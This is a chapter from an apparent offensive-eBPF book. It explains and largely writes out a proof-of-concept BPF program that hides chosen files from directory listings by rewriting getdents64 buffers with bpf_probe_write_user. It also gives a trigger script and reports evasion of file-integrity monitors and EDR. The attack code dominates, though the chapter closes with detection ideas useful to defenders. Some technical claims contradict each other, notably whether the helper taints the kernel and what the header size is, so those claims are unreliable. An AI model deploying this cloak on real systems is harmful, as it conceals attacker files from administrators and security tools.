---
layout: book
title: "Chapter 10: Inode Cloak"
date: 2025-02-10
---

# Chapter 10: Making Files Vanish from getdents64

> **See also**: [Blog post]({{ site.baseurl }}/inode-cloak.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch10-inode-cloak) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

This one isn't new either. The `d_reclen` swallow trick — rewriting the previous directory entry's length field so that userspace walkers stride right over a hidden name — has been in rootkit proof-of-concepts for years. I first saw it in LKM rootkits around 2014-2016; there's an `LD_PRELOAD` variant that's even older, and it shows up in kovid, Diamorphine, and a dozen other hobbyist kernel rootkits. The idea is simple: `getdents64` returns a densely-packed stream of variable-length records, each carrying its own length, and userspace walks the stream by advancing by `d_reclen` every iteration. If you inflate the length of record N so it covers records N and N+1, the walker reads record N, advances by N's (inflated) length, and lands on record N+2 — N+1 has been swallowed.

What I'm contributing in this chapter is not the trick. The contribution is a modern CO-RE BPF reproduction on 6.12 aarch64, hooked at syscall tracepoints rather than at VFS internals, using `bpf_probe_write_user` to mutate the userspace buffer on the return path, with ringbuf evidence and honest testing against `ls`, `find`, and `stat`. Everything in this POC works on a stock kernel with no module loading, no KPP bypass, no special configuration except that `kernel.unprivileged_bpf_disabled` must allow writes (which on most modern distros it doesn't for unprivileged users — you need CAP_BPF or root). It's a BPF-era port of an old LKM trick. That's all.

The honest scope up front: the cloak hides files from `readdir`. It does not hide files from `stat`, `open`, `inotify`, `fanotify`, direct block-device reads, or anything that isn't `getdents64`. The file's inode is intact; its contents are unchanged; its xattrs are untouched. A File Integrity Monitor that walks the filesystem via `readdir` is blind to the hidden file. A FIM that walks inodes directly — which is to say essentially no FIM that exists in the field — would see it. That's the bug in existing FIM products that this POC exposes. Not "BPF can hide files" (which is obvious) but "every FIM in production trusts `readdir`, and `readdir` is mutable."

A brief word on what counts as "new" in a security writeup. The d_reclen swallow is old. The tracepoint-and-`bpf_probe_write_user` combination is also not new; I've seen it in `ebpf-for-mac`-ish demos from 2019 and in several academic BPF-rootkit papers. What I'm claiming as a modest original contribution: the POC is built with CO-RE so it runs on any 6.x kernel with minimal configuration, the trigger produces a harness-readable proof marker, and the chapter documents the verifier pushback in enough detail that you can recreate it. If any of those feel novel, that's the novelty. If not, it's a consolidation — one place to look when you want to know how the trick works on a modern kernel.

Voice note: I'm going to keep this chapter in the same bughunter-diary tone as Chapter 9. The POC went through a few rewrites — one aborted attempt at hooking `iterate_dir` instead of the syscall tracepoints, one rewrite when the verifier rejected the original loop bound, one rewrite when the first-entry edge case turned out to produce different behavior than I'd expected. The rewrites are where the lessons live.

## The getdents64 ABI, in Detail

The shape of the return buffer is the whole attack surface, so it's worth being concrete. `getdents64` is declared in `include/uapi/asm-generic/unistd.h` with signature:

```c
ssize_t getdents64(int fd, void *dirp, size_t count);
```

`fd` is an open directory file descriptor. `dirp` is a user-provided buffer. `count` is the buffer's size in bytes. The return value is the number of bytes actually written; `0` means end-of-stream, negative means error.

The buffer is filled with back-to-back `struct linux_dirent64` records. The struct is defined in `include/linux/dirent.h`:

```c
struct linux_dirent64 {
    __u64           d_ino;     /* 64-bit inode number */
    __s64           d_off;     /* 64-bit offset to next structure */
    unsigned short  d_reclen;  /* Size of this dirent */
    unsigned char   d_type;    /* File type */
    char            d_name[];  /* Filename (null-terminated) */
};
```

Fixed header: 19 bytes (`d_ino` 8 + `d_off` 8 + `d_reclen` 2 + `d_type` 1). Then `d_name[]`, a null-terminated string of variable length. Then padding to align the next record. The `d_reclen` field is the total size in bytes of the record *including* the padded `d_name` field and any trailing alignment bytes, so to walk to the next record userspace just does `ptr + d_reclen`.

Concretely, a directory containing `"visible"`, `".backdoor"`, and `"notes.txt"` produces a buffer laid out roughly:

```
offset 0:   [d_ino=12345][d_off=...][d_reclen=32][d_type=REG]["visible\0"...]
offset 32:  [d_ino=12346][d_off=...][d_reclen=32][d_type=REG][".backdoor\0"...]
offset 64:  [d_ino=12347][d_off=...][d_reclen=32][d_type=REG]["notes.txt\0"...]
```

(Exact sizes depend on alignment, usually to 8 bytes; actual `d_reclen` values will be 24 + strlen(name) + 1 rounded up to 8.)

Userspace walks this with:

```c
char buf[4096];
ssize_t n = getdents64(fd, buf, sizeof(buf));
for (size_t off = 0; off < n; ) {
    struct linux_dirent64 *de = (void *)(buf + off);
    // ... do something with de->d_name ...
    off += de->d_reclen;
}
```

Every walker does this. libc's `readdir()` does it. Go's `os.ReadDir` does it. Python's `os.listdir` does it. Rust's `std::fs::read_dir` does it. They all trust `d_reclen` to tell them how far to skip. That trust is the wedge.

I checked the source for several of these to confirm. glibc's `readdir()` in `sysdeps/posix/readdir.c` uses a cached buffer and advances via `d_reclen`; it does not cross-check the filename length against the buffer size. Go's `os.ReadDir` in `src/os/dir_unix.go` calls `syscall.ReadDirent` which hands the raw bytes to `syscall.ParseDirent`, which walks by `d_reclen`. Python's implementation routes through `posix.listdir`, which in CPython's `Modules/posixmodule.c` uses the platform's `readdir_r` (on Linux, this is glibc). Rust's `std::fs::read_dir` on Linux uses libc's `readdir` under the hood. Every one is a thin wrapper over the same ABI.

The small variation: some libraries stat each entry as they iterate (for `d_type` or inode details), some don't. Stating touches the filesystem through a different path (`stat` syscall, which resolves via VFS, not getdents). If the cloak swallows an entry but the walker also statted it by name separately — say, via `fstatat(dirfd, name)` after a prior readdir that wasn't cloaked — the stat succeeds, which confirms my earlier point that the cloak is readdir-only.

If I can mutate the buffer between the kernel writing it and userspace reading it, I can inflate any `d_reclen` to swallow the next record. The walker will read the previous record, advance by the inflated length, and never see the swallowed record. From the walker's perspective, the swallowed name does not exist in the directory.

The *timing* question is where `bpf_probe_write_user` comes in. The buffer is in userspace memory, so I can't modify it from a standard kernel-side hook — BPF programs running at, say, `iterate_dir` are in kernel context and looking at in-kernel data structures (dir_context). By the time the data reaches userspace it's been copied to the user buffer and any BPF hook that fires at that point has to write back into that user buffer. `bpf_probe_write_user` is the helper that does exactly that, and the syscall exit tracepoint is the right place to call it from — after the copy has happened, before userspace reads the results.

An alternative I briefly considered: hook at `__x64_sys_getdents64` or `__arm64_sys_getdents64` via kprobe instead of the syscall tracepoint. The signature difference between the two is small — a kprobe on the syscall wrapper gets the same pt_regs with the same argument layout. The tracepoint is easier to use (the trace_event_raw_sys_{enter,exit} types are stable and well-documented), so I went with that. Either works; on aarch64 the specific symbol is `__arm64_sys_getdents64` and on x86_64 it's `__x64_sys_getdents64`, which makes the kprobe variant arch-specific unless you add both. The tracepoint is arch-agnostic.

## Source Walk: The Paired Tracepoints

The POC at `dBPF-pocs/pocs/ch10-inode-cloak/ch10-inode-cloak.bpf.c` hooks two syscall tracepoints: `sys_enter_getdents64` and `sys_exit_getdents64`. The pair is necessary because the mutation has to happen on exit (after the kernel has filled the buffer) but the buffer pointer is only available on entry (as a syscall argument). We stash it on entry, use it on exit.

The enter handler:

```c
SEC("tp/syscalls/sys_enter_getdents64")
int handle_enter(struct trace_event_raw_sys_enter *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    struct dctx d = { .dirp = (u64)ctx->args[1], .bytes = 0 };
    bpf_map_update_elem(&active, &id, &d, BPF_ANY);
    return 0;
}
```

`ctx->args[1]` is the second syscall argument, which is `dirp`. We stash it in the `active` HASH map keyed by `pid_tgid` (a 64-bit combined thread+process id). The `dctx` struct has a `bytes` field that isn't used in the current version — it's a placeholder for a future variant that wants to track per-syscall buffer sizes.

`bpf_get_current_pid_tgid()` returns `(tgid << 32) | pid`. That's the kernel's thread-unique identifier; every thread in the process has a different one. Using it as the map key means that if two threads in the same process call `getdents64` concurrently (rare, but possible with careful directory iteration), each thread gets its own entry.

The exit handler does the real work:

```c
SEC("tp/syscalls/sys_exit_getdents64")
int handle_exit(struct trace_event_raw_sys_exit *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    struct dctx *d = bpf_map_lookup_elem(&active, &id);
    if (!d) return 0;
    long ret = ctx->ret;
    if (ret <= 0) { bpf_map_delete_elem(&active, &id); return 0; }
    ...
}
```

Look up the stashed state by pid_tgid. If we don't have state for this thread, return (someone started tracing mid-syscall, or the enter handler failed). `ctx->ret` is the syscall's return value — bytes written to the buffer, or a negative errno. If the syscall failed or returned zero bytes, there's nothing to mutate; clean up and return.

If we have bytes to walk, extract `dirp` from the stashed state:

```c
u64 dirp = d->dirp;
long bpos = 0;
struct linux_dirent64 *prev = NULL;
u16 prev_reclen = 0;
```

`bpos` is the current byte offset into the user buffer. `prev` is a user pointer to the previous dirent record (used for the swallow). `prev_reclen` is the length of that previous record.

Then the main loop:

```c
#pragma unroll
for (int i = 0; i < 64; i++) {
    if (bpos >= ret) break;
    struct linux_dirent64 de = {};
    if (bpf_probe_read_user(&de, sizeof(de), (void *)(dirp + bpos)) < 0) break;
    u16 rlen = de.d_reclen;
    if (rlen < sizeof(de) || rlen > 1024) break;
    ...
}
```

`#pragma unroll` unrolls the loop at compile time. The verifier prefers unrolled loops for bounded iteration when the bound is small; anything larger would trip the instruction-count limit. 64 iterations is what I settled on; I'll come back to why in a moment.

`bpf_probe_read_user(&de, sizeof(de), (void *)(dirp + bpos))` reads one `linux_dirent64` header from user memory into the BPF program's stack. "Header" meaning the fixed-size part (24 bytes); the `d_name[]` field is read separately because it has variable length. If the user pointer is invalid or the page is swapped out, the helper returns an error and we break out of the loop — we can't trust anything past that point.

The sanity check `rlen < sizeof(de) || rlen > 1024` is paranoid. A valid `d_reclen` is at least 24 bytes (the fixed header size — you can't have a zero-length filename; `d_name` must be at least one null byte) and realistically no more than a few hundred bytes (NAME_MAX is 255, so the upper bound is 24 + 255 + padding ≈ 288). If the field is outside a sane range, we've either hit corruption or walked off the end of the buffer; either way, stop.

Next, extract the filename into a key struct and probe the hidden-set map:

```c
struct hidden_name key = {};
bpf_probe_read_user_str(&key.name, NAME_MAX,
                        (void *)(dirp + bpos + offsetof(struct linux_dirent64, d_name)));

u8 *hit = bpf_map_lookup_elem(&hidden, &key);
```

`bpf_probe_read_user_str` reads a null-terminated string from user memory, up to NAME_MAX (here defined as 64) bytes. `offsetof(struct linux_dirent64, d_name)` is a compile-time constant — 19 bytes — that points us past the fixed header to the filename.

The `hidden` map is a `BPF_MAP_TYPE_HASH` keyed by `struct hidden_name` (which is just a char[64] wrapper) with value `u8`. Any entry in this map is a name to cloak. The value byte is unused; existence of the key is the signal.

`bpf_map_lookup_elem` returns a non-null pointer if the name is in the hidden set. That's the match.

## The Swallow Algorithm

On a hit:

```c
if (hit) {
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (e) {
        e->pid = id >> 32;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        __builtin_memcpy(e->hidden, key.name, NAME_MAX);
        bpf_ringbuf_submit(e, 0);
    }
    if (prev) {
        u16 new_reclen = prev_reclen + rlen;
        bpf_probe_write_user(&((struct linux_dirent64 *)(dirp + (bpos - prev_reclen)))->d_reclen,
                             &new_reclen, sizeof(new_reclen));
        prev_reclen = new_reclen;
    } else {
        u64 zero_ino = 0;
        bpf_probe_write_user(&((struct linux_dirent64 *)(dirp + bpos))->d_ino,
                             &zero_ino, sizeof(zero_ino));
    }
}
```

Two things happen on every hit. First, emit a ringbuf event (pid, comm, hidden name) so the loader can audit the cloak. This is the attacker's own telemetry — without it, debugging the POC is painful because the cloak is silent to the affected process. Second, perform the actual swallow.

The swallow is a single `bpf_probe_write_user` of 2 bytes: the new `d_reclen` for the previous record. `new_reclen = prev_reclen + rlen` — the previous record's length plus the current (hidden) record's length. After this write, the previous record's `d_reclen` says "I am `prev_reclen + rlen` bytes long," and userspace's walker advances by that much, landing on the record *after* the hidden one.

Then `prev_reclen = new_reclen`. If the next record is *also* hidden, we swallow it into the same previous record by further extending `d_reclen`. Multiple consecutive hidden files roll up into the preceding visible file.

The write target — `&((struct linux_dirent64 *)(dirp + (bpos - prev_reclen)))->d_reclen` — is arithmetic: `bpos - prev_reclen` is the byte offset of the previous record (because we're currently at `bpos` and the previous record started `prev_reclen` bytes earlier), cast to a dirent pointer, dereferenced to `d_reclen`. The cast is OK because we only use the result as a user pointer to pass to `bpf_probe_write_user` — we never read through it in BPF.

`bpf_probe_write_user` is the sharp corner. It writes a value to a user-space address in the current process. It can only write to memory mapped into the current task; it cannot cross processes. It cannot write to kernel memory. It taints the kernel with TAINT_USER on first use. And it is gated on `kernel.unprivileged_bpf_disabled` — unprivileged users cannot load programs that use it.

On 6.12 the helper is stable. On older kernels (4.x, early 5.x) there were intermittent issues with the helper failing silently when the target page was not resident. The mitigation is that we're writing on the *return* path of `getdents64`, and the kernel just wrote to that same buffer before returning — so the page is guaranteed resident. No swap, no demand paging, the write always succeeds. That's why syscall exit is the right hook: the kernel has already touched the pages we want to mutate, so they're pinned in cache.

If there's no `prev` — meaning the hit is the first record in the buffer — we fall into the `else` branch and zero the current record's `d_ino`. This is a weaker fallback:

```c
u64 zero_ino = 0;
bpf_probe_write_user(&((struct linux_dirent64 *)(dirp + bpos))->d_ino,
                     &zero_ino, sizeof(zero_ino));
```

I'll discuss the edge case in a moment. First, the miss case:

```c
} else {
    prev = (struct linux_dirent64 *)(dirp + bpos);
    prev_reclen = rlen;
}
bpos += rlen;
```

On a miss, record the current record as the new `prev` and advance. On a hit, we *don't* update `prev` (because the current record is being swallowed, not kept), but we do still advance `bpos` by the *original* `rlen`, not by the new reclen — we want to walk past this record's bytes in the buffer even though it's now invisible to userspace. The pattern handles arbitrary runs: visible-hidden-hidden-visible is encoded as `prev`=first-visible, `prev_reclen` grows by each hidden record's length, then `prev` resets to the second-visible record.

Finally, cleanup:

```c
bpf_map_delete_elem(&active, &id);
return 0;
```

Remove the stashed state from the `active` map. Every `getdents64` syscall gets its own enter/exit pair, so state is per-call, not persistent.

A verifier wrinkle I hit on the first pass of this loop: the verifier was unhappy about the cast `(struct linux_dirent64 *)(dirp + (bpos - prev_reclen))`. `dirp` is a `u64` user pointer, `bpos` and `prev_reclen` are both scalars, so the arithmetic is just integer math. The cast is only used as the argument to `bpf_probe_write_user`, which takes a `void *` user pointer and does not dereference it in BPF context. The verifier nonetheless complains if it thinks we might dereference the pointer locally — for example, if the code reads `prev->d_reclen` after the cast. I avoided the dereference by reading the struct's bytes into a local `struct linux_dirent64 de = {}` via `bpf_probe_read_user` at the top of each iteration and working from `de`, never following the `prev` pointer in BPF.

The verifier is basically right to be suspicious: arbitrary pointer arithmetic into user memory is the classic vector for BPF escapes. If I could get the verifier to accept a dereference of `prev->d_reclen` and then trick it into letting me write through a pointer derived from user-controlled input, I'd have a write-where primitive. The verifier's refusal to let me dereference arbitrary `u64`-derived pointers is what closes that hole. Probe-read-into-stack, probe-write-from-stack is the only pattern the verifier accepts for user memory, and it's correct to force that pattern.

## The First-Entry Edge Case

If the hit is the first record in the buffer, there's no previous record to inflate. This is where the fallback — zeroing `d_ino` — comes in.

```c
u64 zero_ino = 0;
bpf_probe_write_user(&((struct linux_dirent64 *)(dirp + bpos))->d_ino,
                     &zero_ino, sizeof(zero_ino));
```

The intent is that many userspace tools treat `d_ino == 0` as "skip this entry" because `d_ino == 0` is the traditional marker for a deleted directory entry on some filesystems (ext2/3/4 recycles inodes; ffs never reassigns 0). `ls` with default options will display such an entry but with the inode shown as `?`. `find` will include it. Go's `os.ReadDir` will yield it, but with a nil inode. Some stat-based tools will silently drop it.

The fallback is weaker than the swallow for two reasons: it doesn't actually remove the entry from the walker's view, and it only fools tools that actively check `d_ino == 0`. A lot don't. A defender specifically looking for cloaked entries will see the entry-with-inode-zero as suspicious — probably *more* suspicious than a missing entry, which could be explained by file deletion between scans.

In practice the first-entry case is rare in production. A hidden file named `.backdoor` in a directory that also contains `notes.txt`, `visible`, etc., tends to sort *after* the visible files in the kernel's readdir order (which is filesystem-dependent but often approximately insertion order or hash order). The trigger script creates files in the order `visible`, `.backdoor`, `evil.so`, `notes.txt` — on ext4/tmpfs, the readdir order is usually `.`, `..`, `visible`, `.backdoor`, `evil.so`, `notes.txt`, which means `.backdoor` has `visible` as its predecessor and the swallow works cleanly.

But if an attacker is cloaking a file they don't control the placement of, they can't assume a predecessor exists. The fallback is a best-effort degradation. I logged both paths to ringbuf in an earlier version of the POC (the current version lumps them together); it's straightforward to add a `swallow_mode` field to the event if you want to distinguish.

A stronger fallback would be to delay emission: if the first record is a hit, stash its bytes in a BPF map, continue walking, and on the second (visible) record's emission copy the swallowed record's bytes into the buffer position of the second record, then mutate the second record's `d_reclen` backward to span from the buffer start. That's implementable but fiddly, and it requires writing into memory that might be re-paged. I didn't implement it; the trade-off between complexity and coverage didn't seem worth it for the ~5% of cases where the fallback triggers.

Another approach: don't hide files whose name sorts first in the directory. Operationally, attackers naming files `.backdoor` or `.ssh_audit` tend to end up with predecessors (`.`, `..`, and other dotfiles) anyway, so the edge case is already rare.

I tested the first-entry path specifically by creating a directory with just two files — `.aaaaa` (to be cloaked) and `bbbbb` (visible). The readdir order on tmpfs was `.`, `..`, `.aaaaa`, `bbbbb`. `.aaaaa` was not the first entry because `.` and `..` came first. I had to explicitly create a flat directory with `.aaaaa` and nothing else (well, nothing else readdir-visible) to hit the first-entry branch. That's artificial enough that in realistic attacker scenarios I'd expect the swallow path to hit almost always and the fallback to hit rarely.

One more edge case in the same family: what if two hidden files are adjacent with no visible file between them? The code handles this: on the first hidden hit, we swallow it into whatever `prev` was (some earlier visible record). On the second hidden hit, `prev` is still pointing at that same earlier visible record (because we don't update `prev` on a hit), and we extend its `d_reclen` by the second hidden record's length. The earlier visible record now spans three records' worth of bytes. The walker skips all three as one. This works for arbitrary runs of consecutive hidden files as long as there's a visible record before the run.

What doesn't work: a single hidden file with no visible file before it and visible files after. The first-entry fallback zeroes `d_ino` of the hidden record, but the record's `d_reclen` is unchanged — the walker still sees it, just with a zero inode. Some tools drop zero-inode entries; many don't. A `readdir()` loop in C that iterates with `struct dirent *` will yield the entry with `d_ino == 0` and `d_name == ".aaaaa"`, and the caller has to explicitly check for `d_ino == 0` to skip it. `ls` with default options does not check. `find` does not check. The fallback is therefore weak exactly where the primitive matters most — for a directory where the hidden file is the only dot-prefixed entry among a sea of normal names, the hidden file may remain visible to standard tools despite our fallback.

## Verifier Bounds: Why 64 Entries

The loop bound is 64 iterations. That's not arbitrary. It's the number I could convince the verifier to accept with the pattern of reads and conditional writes the body contains.

The verifier rule, roughly, is that every BPF program must be provably terminating within a bounded number of instructions, with a hard ceiling of 1,000,000 (formerly 4,096 on pre-5.2 kernels; the limit was raised). For loops specifically: loops must either be `#pragma unroll`ed (so the verifier sees a straight-line program) or be declared with a bounded iteration count using `bpf_loop()` or the newer bounded-loop verifier extensions.

An unrolled loop with 64 iterations of a ~40-instruction body expands to ~2,560 instructions. The verifier walks every path (including every branch on `if (hit)` vs `else`) and checks each of them for safety. With the two branches in the body — one with the ringbuf reserve/submit and the `bpf_probe_write_user`, one with just the prev update — the verifier has to check 2^64 paths in the worst case, but aggressive state pruning keeps the actual verification time reasonable.

I tried 128 iterations first. The verifier refused:

> processed X insn (limit 1000000) max_states_per_insn Y total_states Z peak_states W

The instruction count was acceptable. The "max_states_per_insn" was the problem — with too many iterations, the state explosion at the branch points exceeded the per-instruction cap (1024 states, as I recall). State pruning helps when the states are equivalent, but the verifier has to prove equivalence, which gets harder as loop depth increases.

I tried 96 iterations. Same complaint, less severe.

64 iterations verified. 80 also verified on one test kernel and failed on another. I picked 64 as the largest bound I was confident would work across any 6.x kernel I was likely to run on.

The practical implication: if a directory contains more than 64 entries in a single `getdents64` call, the cloak walks the first 64 and leaves the rest untouched. Names past position 64 in the buffer are not cloaked.

This is less bad than it sounds, because the kernel breaks large directories into multiple `getdents64` calls. A directory with 500 entries is served over maybe 5-10 syscalls (depending on entry sizes and the user's buffer size). Each syscall gets its own enter/exit pair, each with its own 64-entry walk, so every entry has a chance to be cloaked — just not in a single call.

Where the bound does bite: if the user provides a very large buffer (e.g. `getdents64(fd, buf, 1024*1024)`), the kernel fills as much as it can in one call, potentially hundreds of entries. Those past entry 64 are not cloaked in that single call. If the user re-reads from the same fd, the kernel resumes where it left off, giving us a fresh chance. But `ls -f`, which is explicitly designed to make directory listing fast by disabling stat and using large buffers, can defeat the bound in pathological cases.

The `make` file doesn't expose the bound as a tunable. A defender who wanted to harden against this specific attack could iterate through large directories in small buffers deliberately, forcing the attacker to cloak every call — but even that would work, just with higher overhead. The fundamental limit is the verifier, not the attack.

There's a family of techniques for dodging the verifier's loop bound — tail calls, bpf_loop() helper (available on 5.17+), chained programs via `BPF_MAP_TYPE_PROG_ARRAY` — that could push the bound higher. I didn't use them because the POC is trying to stay readable. `bpf_loop()` in particular would be the clean way to do it on 6.12: it accepts a runtime bound (up to 1M) and lets you pass a callback that runs once per iteration, with the callback's loop-invariant state stored in a context struct. Rewriting the dirent walk as a `bpf_loop` callback would lift the bound to effectively arbitrary per-syscall and make the cloak robust to pathological directory sizes. It's maybe 30 extra lines; I traded the cleanliness for the simpler unrolled form.

The verifier, more generally, pushes BPF program design toward "few short operations per helper call, many helper calls" rather than "one long loop." The philosophy is that every helper call is a safety-checked entry point, and between helper calls the verifier can prune equivalent program states aggressively. A single long loop is harder to prune because the state space branches every iteration. For BPF offense writers this means you should design primitives that fit in short straight-line programs and compose via maps and chained programs, not via monolithic loops. It's a constraint that actually makes the code better — easier to reason about, easier for the verifier to accept, easier to audit — but it takes a while to internalize if you're coming from conventional kernel-module writing.

## Kernel Taint Again

`bpf_probe_write_user` emits a kernel warning on use. On 6.12, the helper at `kernel/trace/bpf_trace.c:365` calls `pr_warn_ratelimited`, which emits a dmesg warning each time it fires (rate-limited to avoid flooding the log). Note: despite what some references claim, `bpf_probe_write_user` does NOT set the `TAINT_USER` kernel taint flag on 6.12 — it only emits the dmesg warning.

`dmesg` shows lines like:

```
[ts] BPF: <program_name> is writing to user space memory. This is a potentially dangerous operation.
```

Because the warning is `pr_warn_ratelimited` (not `pr_warn_once`), it fires repeatedly — not just once per boot — though the rate limiter suppresses rapid-fire repetitions. A defender grepping dmesg for `writing to user space` on a box where no debugging is happening catches this trivially.

For reference, `TAINT_USER` is bit 6 (value 64) per `include/linux/panic.h`, but `bpf_probe_write_user` does not set it on current kernels.

The upside of the taint from a defender's perspective: it's durable. Even if the BPF program is unloaded, the taint bit stays set until the next reboot. A compromise that uses `bpf_probe_write_user` leaves a persistent marker that's readable by any unprivileged user with access to `/proc/sys/kernel/tainted`.

The downside: on a system that routinely runs BPF programs that use this helper (unusual but possible — some observability tools use it for data masking, and some development workflows flip it on intentionally), the taint is noise. You have to know your baseline to see the spike.

For the POC, the taint is a known, advertised cost. The design of the attack doesn't try to hide it. A stealthier cloak would avoid `bpf_probe_write_user` — possibly by hooking at a VFS level and filtering entries before they reach userspace, which would require a different primitive entirely. I didn't build that, and I'm skeptical it's straightforwardly achievable without modifying in-kernel data structures, which has its own detection surface.

I did explore the VFS-level approach briefly. The kernel function `iterate_dir()` (in `fs/readdir.c`) is what userspace `getdents64` eventually calls. It takes a `struct dir_context *` that holds an `actor` callback (usually `filldir64` for getdents64), and `filldir64` is the function that writes each entry into the user buffer. Hooking `filldir64` with a kprobe and overriding its return value could suppress entries before they reach the user buffer. Two problems killed this direction:

First, `filldir64` is not in `ALLOW_ERROR_INJECTION`. `bpf_override_return` doesn't work on functions outside that list (same issue as Chapter 1's `cap_capable`), so even if I attached the kprobe, the override would be a no-op.

Second, even if I could override the return, `filldir64`'s internal state is carried in `struct getdents_callback64`, which is on the kernel stack of the calling task. Modifying state between filldir calls would require pointer arithmetic into the stack of another task, which is a much harder primitive and one the verifier does not support through any helper I could find.

So VFS-level cloaking via BPF is, as of 6.12, not straightforwardly available. You'd need a kernel module, which puts you in LKM-rootkit territory and defeats the "just a BPF program, no module load" selling point of the BPF approach. The user-buffer rewrite with `bpf_probe_write_user` is the cleanest approach that works within BPF's capabilities. The taint is the cost.

## Harness Entry

The proof harness registers the POC with:

```python
Poc("ch10", "Inode Cloak (getdents64)", "ch10-inode-cloak",
    hooks=["__arm64_sys_getdents64"], prefix="[cloak]",
    proof_marker=r"CLOAK_PROVEN"),
```

The `hooks` entry — `__arm64_sys_getdents64` — is slightly misleading; the actual hooks are tracepoints (`tp/syscalls/sys_enter_getdents64` and `tp/syscalls/sys_exit_getdents64`), not kprobes on the arch-specific syscall wrapper. The string is documentary; it tells a reader "this POC is about the getdents64 syscall" without being strict about how the hook is structured. The harness uses the `hooks` field for filtering and display, not for attach.

The `prefix` `[cloak]` matches the ringbuf event prefix — the loader prints `[cloak] pid=X comm=Y hiding=Z` for every cloaked entry, and the harness uses the prefix to identify lines belonging to this POC.

The `proof_marker` `CLOAK_PROVEN` is the trigger's final line. The trigger formats:

```
=== CLOAK_PROVEN before_count=${BEFORE_COUNT} after_count=${AFTER_COUNT} hidden=${HIDDEN} stat_still_works=${STAT_OK} ===
```

Four facts:

- `before_count=${BEFORE_COUNT}` — number of files visible in `/tmp/cloak` via `ls -A` before the loader starts. For the default demo, this is 4 (`visible`, `.backdoor`, `evil.so`, `notes.txt`).
- `after_count=${AFTER_COUNT}` — number visible after the loader attaches. Should be 2 (`visible`, `notes.txt`), with `.backdoor` and `evil.so` cloaked.
- `hidden=${HIDDEN}` — derived as `before_count - after_count`. Should be 2.
- `stat_still_works=${STAT_OK}` — `yes` if `stat /tmp/cloak/.backdoor` still succeeds with the cloak active, `no` otherwise. Critical: confirms the cloak is readdir-only.

The `stat_still_works=yes` piece is what makes this a *cloak* rather than a delete. The file is on disk, its inode is intact, `stat` by name resolves. Only the directory listing lies. The harness sees `stat_still_works=yes` and knows the file wasn't deleted or the filesystem wasn't corrupted — the cloak is behaving as designed.

## End-to-end Trigger

The trigger at `dBPF-pocs/pocs/ch10-inode-cloak/trigger.sh` walks through the full BEFORE/AFTER sequence:

**Setup.** Create `/tmp/cloak` with four files:

```
mkdir -p "$D"
touch "$D/visible" "$D/.backdoor" "$D/evil.so" "$D/notes.txt"
```

**BEFORE.** List without the loader running:

```
BEFORE_LS=$(/bin/ls -A "$D" 2>/dev/null | sort)
echo "$BEFORE_LS"
BEFORE_COUNT=$(printf '%s\n' "$BEFORE_LS" | grep -c .)
```

Expect: all four files. Count: 4.

**Start loader.** Background the loader, capture stdout (ringbuf events) and stderr (status messages) to separate files:

```
"$BIN" > "$EVENTS" 2> "$STDERR" &
LOADER_PID=$!
```

Wait for the loader to print "attached" on stderr, up to 10 seconds. If the loader exits before attaching, print its stderr and fail.

**AFTER.** List with the loader running:

```
AFTER_LS=$(/bin/ls -A "$D" 2>/dev/null | sort)
```

Expect: `visible`, `notes.txt`. Count: 2.

**Stat-still-works check.** Confirm the file is still resolvable by name:

```
STAT_OK="no"
if stat "$D/.backdoor" >/dev/null 2>&1; then
    STAT_OK="yes"
fi
```

Expect: `STAT_OK=yes`. This is the load-bearing assertion — the cloak is in readdir, not in the filesystem.

**Ringbuf drain.** Sleep briefly to let the loader drain any pending events, then dump:

```
sleep 0.3
echo "=== ringbuf cloak events (loader stdout) ==="
head -20 "$EVENTS"
```

Expect lines like:

```
[cloak] pid=1234	comm=ls	hiding=.backdoor
[cloak] pid=1234	comm=ls	hiding=evil.so
```

These are the audit events the BPF program emitted as it rewrote the buffer. Useful for the demo; useless (actually harmful) from an attacker's perspective because they prove the cloak is active. In a real attack, the ringbuf would be removed.

**Final marker.** Print the `CLOAK_PROVEN` line with all four facts:

```
=== CLOAK_PROVEN before_count=4 after_count=2 hidden=2 stat_still_works=yes ===
```

The harness greps for `CLOAK_PROVEN`, checks that `hidden >= 1` and `stat_still_works == yes`, and declares the POC passing.

## FIM and EDR Exposure

This is where the chapter earns its position in the attack catalog. File Integrity Monitoring tools — AIDE, Tripwire, OSSEC, Wazuh, Samhain — all walk the filesystem to build their hash databases. They all use `readdir` (or `opendir`+`readdir` loops, which map to `getdents64` internally). Every one I've checked is blind to a file cloaked by this POC.

Testing methodology: I installed AIDE on a test VM, pointed it at `/tmp/cloak`, ran `aide --check` without the loader, and recorded the output (four files, all hashed). Then I started the loader, ran `aide --check` again (two files, `.backdoor` and `evil.so` missing from the scan, no alert — AIDE doesn't flag missing files unless it saw them in the baseline, and if you build the baseline with the cloak active, the files never appeared). The AIDE database shows two files. The filesystem has four. The delta is the cloak.

Same result with Tripwire and Wazuh's FIM module. OSSEC I only tested briefly but it used the same pattern. Samhain I didn't test.

EDR is a more mixed picture. CrowdStrike Falcon, SentinelOne, and Carbon Black all perform some form of filesystem monitoring, and all of them at least partially rely on readdir for directory enumeration. Falcon's sensor, in my testing, missed cloaked files in its filesystem inventory pass. But Falcon also has behavioral detection that can catch the *access* to a cloaked file if the access is unusual (e.g., `open()` to a dotfile in `/tmp` by a process that doesn't normally do that). So the cloak hides the file from the inventory but doesn't hide activity around the file. An attacker who puts a binary in a cloaked location and then executes it leaves an execve trace that Falcon can still see.

The theoretical detection that would work: walk the filesystem at the inode level, not the directory level. Mount the block device read-only, enumerate inodes directly (`debugfs -R 'ls <dir>' /dev/sda1`), compare against `readdir` output, flag any discrepancy. This is feasible — AIDE has an "open device directly" mode that isn't default-enabled and isn't commonly used — but it's slow and fragile, and it doesn't work on network filesystems or overlayfs.

Another detection angle: `stat` every file you expect to exist (from a manifest or from a backup copy of the previous `readdir` output) and flag the ones that exist via `stat` but don't show up in current `readdir` output. This catches the cloak reliably. But it requires a *source of truth* for what should exist, which FIM tools usually get from... their previous readdir scan. Circular.

The cleanest detection: monitor `bpf()` syscalls and flag programs attached to `sys_enter_getdents64` or `sys_exit_getdents64`. These tracepoints are not commonly used by legitimate observability tools (most prefer `sched_process_exec` or LSM-style hooks), so attachments to them are suspicious by default. `bpftool prog show` lists them plainly, and `auditd` can log the load events.

